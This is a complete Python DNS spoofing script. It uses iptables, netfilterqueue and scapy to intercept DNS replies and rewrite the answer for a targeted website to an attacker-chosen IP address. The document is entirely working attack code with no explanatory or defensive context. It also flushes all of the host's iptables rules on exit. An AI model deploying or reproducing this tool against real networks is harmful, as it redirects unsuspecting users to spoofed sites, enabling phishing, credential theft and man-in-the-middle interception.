#!/usr/bin/env python3

import netfilterqueue
import argparse
import os
import scapy.all as scapy

def get_arguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-r", "--redirect-ip", dest='redirect_ip', help="IP address to which traffic need to be redirect.")
	parser.add_argument("-w", "--web", dest='website', help="website to be spoofed.")
	options = parser.parse_args()
	if not options.redirect_ip:
		 parser.error("[-] Please specify a redirect IP, use -h or --help for more info.")
	if not options.website:
		 parser.error("[-] Please specify a website to be spoofed, use -h or --help for more info.")
	return options

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if options.website in str(qname):
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname=qname, rdata=options.redirect_ip)
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(bytes(scapy_packet))
	packet.accept()
options = get_arguments()
try:
	os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
	os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()
except KeyboardInterrupt:
	print("[+] Resetting IP tables")
	os.system("iptables --flush")

